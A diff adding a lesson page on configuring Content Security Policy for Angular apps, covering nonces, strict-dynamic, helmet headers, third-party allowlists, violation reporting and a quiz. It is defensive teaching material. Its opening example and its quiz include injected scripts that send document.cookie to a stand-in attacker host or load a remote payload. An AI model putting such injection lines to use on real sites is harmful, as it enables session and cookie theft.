@@ -1,0 +1,256 @@
+---
+title: "Content Security Policy"
+slug: "content-security-policy"
+order: 6
+difficulty: "advanced"
+readingTime: 9
+status: "published"
+tags: ["Angular", "security", "CSP", "Content Security Policy", "nonce", "strict-dynamic", "angular.json"]
+summary: "Content Security Policy is a browser security mechanism that restricts which scripts, styles, and resources can load on your page. Even if XSS occurs, CSP can prevent script execution. Configuring CSP for Angular requires handling inline styles and scripts carefully."
+docsLinks:
+  - label: "Angular Security"
+    url: "https://angular.dev/best-practices/security"
+  - label: "MDN CSP"
+    url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+---
+
+import { Callout, CodeChallenge, Quiz } from '@/components/lesson'
+
+## What CSP Does
+
+Content Security Policy is a last-resort defense: even if an attacker successfully injects malicious HTML, CSP prevents those scripts from executing.
+
+```html
+<!-- Without CSP: injected script executes -->
+<script>fetch('https://evil.com?token=' + document.cookie)</script>
+
+<!-- With CSP: script-src 'self' -->
+<!-- Browser refuses to execute the script — it's not from 'self' -->
+<!-- Console: Refused to execute inline script because it violates
+     the following Content Security Policy directive: "script-src 'self'" -->
+```
+
+CSP is delivered as an HTTP response header or `<meta>` tag:
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; style-src 'self' 'unsafe-inline'
+```
+
+## Angular CSP Challenges
+
+Angular generates some code patterns that conflict with strict CSP:
+
+### 1. Inline Styles (Component Styles)
+
+Angular injects component styles as `<style>` elements in the `<head>`. A strict `style-src 'self'` would block them.
+
+**Solution A: `'unsafe-inline'`** (weaker but simple)
+```
+Content-Security-Policy: style-src 'self' 'unsafe-inline'
+```
+
+**Solution B: Nonce-based CSP** (stronger, Angular 16+)
+```typescript
+// angular.json — generate nonce-aware styles
+{
+  "optimization": {
+    "styles": {
+      "inlineCritical": true
+    }
+  }
+}
+```
+
+```html
+<!-- Server generates random nonce per request -->
+<!-- Passes nonce to Angular via meta tag -->
+<meta name="CSP_NONCE" content="{{ nonce }}">
+```
+
+```typescript
+// Angular reads the nonce and applies it to injected styles
+bootstrapApplication(AppComponent, {
+  providers: [
+    { provide: CSP_NONCE, useValue: document.querySelector('meta[name="CSP_NONCE"]')?.getAttribute('content') }
+  ]
+});
+```
+
+### 2. Inline Scripts (Development Mode)
+
+Angular's development mode uses inline scripts for HMR. Production builds minimize this.
+
+```
+# For production — no 'unsafe-inline' needed for scripts
+Content-Security-Policy: script-src 'self' 'nonce-{RANDOM}'
+```
+
+## Practical CSP for Angular
+
+### Permissive (Phase 1: Getting Started)
+
+Start permissive to understand your current resource needs:
+
+```
+Content-Security-Policy-Report-Only:
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  font-src 'self' data:;
+  connect-src 'self' https://api.yourdomain.com;
+  report-uri /csp-violation-report
+```
+
+`Content-Security-Policy-Report-Only` doesn't block anything — it only reports violations. Use this to audit what your app uses before enforcing.
+
+### Moderate (Phase 2: Realistic Production)
+
+```
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.yourdomain.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: blob: https:;
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self' https://api.yourdomain.com wss://websocket.yourdomain.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self'
+```
+
+### Strict (Phase 3: Maximum Security)
+
+```
+Content-Security-Policy:
+  default-src 'none';
+  script-src 'nonce-{RANDOM}' 'strict-dynamic';
+  style-src 'nonce-{RANDOM}';
+  img-src 'self' https:;
+  font-src 'self';
+  connect-src 'self' https://api.yourdomain.com;
+  frame-ancestors 'none';
+  base-uri 'none';
+  form-action 'self';
+  upgrade-insecure-requests
+```
+
+`strict-dynamic` allows dynamically-created scripts (Angular's lazy loading!) if they're created from an already-trusted script.
+
+## Setting CSP in Angular Applications
+
+### Via Server Response Headers (Recommended)
+
+CSP should be set by the server, not Angular itself:
+
+```typescript
+// Express.js server (Angular SSR or API server)
+import helmet from 'helmet';
+
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", 'data:', 'https:'],
+    connectSrc: ["'self'", 'https://api.example.com'],
+    frameAncestors: ["'none'"],
+    formAction: ["'self'"],
+  }
+}));
+```
+
+### Via Meta Tag (SPA Limitation)
+
+```html
+<!-- index.html — for purely client-side Angular apps -->
+<!-- Note: meta CSP cannot use frame-ancestors directive -->
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               script-src 'self';
+               style-src 'self' 'unsafe-inline';
+               img-src 'self' data: https:;
+               connect-src 'self' https://api.example.com;">
+```
+
+<Callout type="warning">
+CSP delivered via `<meta>` tag is less secure than HTTP headers — it requires the HTML to load first before protection kicks in. Some CSP features (like `frame-ancestors`) don't work via meta tags at all. Always prefer server-side HTTP headers when possible.
+</Callout>
+
+## Handling Third-Party Scripts
+
+Many Angular apps embed third-party scripts (analytics, chat widgets, etc.) that CSP must allow:
+
+```
+// Google Analytics 4
+script-src 'self' https://www.googletagmanager.com https://www.google-analytics.com;
+connect-src 'self' https://www.google-analytics.com https://analytics.google.com;
+img-src 'self' https://www.google-analytics.com;
+
+// Stripe.js
+script-src 'self' https://js.stripe.com;
+frame-src https://js.stripe.com https://hooks.stripe.com;
+connect-src 'self' https://api.stripe.com;
+
+// Intercom
+script-src 'self' https://widget.intercom.io https://js.intercomcdn.com;
+connect-src 'self' https://api.intercom.io wss://nexus-websocket-a.intercom.io;
+```
+
+<CodeChallenge
+  id="csp-script-injection"
+  difficulty="advanced"
+  description="Your Angular app has CSP: script-src 'self'. An XSS vulnerability exists that lets attackers inject: <script src='https://evil.com/payload.js'></script>. What happens?"
+  options={[
+    "The script executes normally — CSP doesn't prevent external script loading",
+    "The browser blocks the script — 'https://evil.com' is not in the allowed script-src list",
+    "Angular's sanitizer removes the script before CSP can evaluate it",
+    "The script downloads but doesn't execute due to CORS restrictions"
+  ]}
+  correctAnswer={1}
+  explanation="CSP script-src 'self' means: only load scripts from the same origin. When the browser encounters <script src='https://evil.com/payload.js'>, it checks the script's origin ('https://evil.com') against the allowed list ('self' = your origin). They don't match, so the browser refuses to load or execute the script — regardless of how it got into the page. This is CSP's core value: even successful XSS injection doesn't lead to code execution if the injected code violates CSP. Note that Angular's sanitizer also removes script tags in [innerHTML], so this attack would be double-blocked — but CSP provides the safety net for cases where sanitization fails."
+/>
+
+## CSP Violation Reporting
+
+```typescript
+// Collect CSP violations for monitoring
+// Server endpoint (outside Angular):
+app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
+  const violation = req.body['csp-report'];
+  logger.warn('CSP Violation', {
+    blockedUri: violation['blocked-uri'],
+    documentUri: violation['document-uri'],
+    violatedDirective: violation['violated-directive'],
+    originalPolicy: violation['original-policy'],
+  });
+  res.sendStatus(204);
+});
+```
+
+```
+// CSP header with reporting:
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self';
+  report-uri /csp-violation-report;
+  report-to csp-endpoint
+```
+
+## Senior Insight: CSP Maturity Levels
+
+Most Angular apps have weak or no CSP. Demonstrating knowledge of CSP maturity is impressive in interviews:
+
+**Level 0** (most apps): No CSP
+**Level 1**: `Content-Security-Policy-Report-Only` (monitoring only, no enforcement)
+**Level 2**: Basic enforcement with `'unsafe-inline'` and `'unsafe-eval'` (not very effective)
+**Level 3**: Nonce-based CSP without `'unsafe-inline'` (real protection)
+**Level 4**: `strict-dynamic` + nonce + `Report-To` header (strict CSP with reporting)
+
+The jump from Level 2 to Level 3 is where real security improvement happens — removing `'unsafe-inline'` is what stops injected scripts from executing. Getting there with Angular requires:
+1. Angular 16+ `CSP_NONCE` support for component styles
+2. Server generating unique nonces per request
+3. Nonces applied to all `<script>` and `<style>` tags
+4. Third-party scripts loaded via nonces or hash
+
+For senior interviews, mentioning the nonce-based approach and its Angular-specific challenges (component style injection) demonstrates thorough security knowledge.
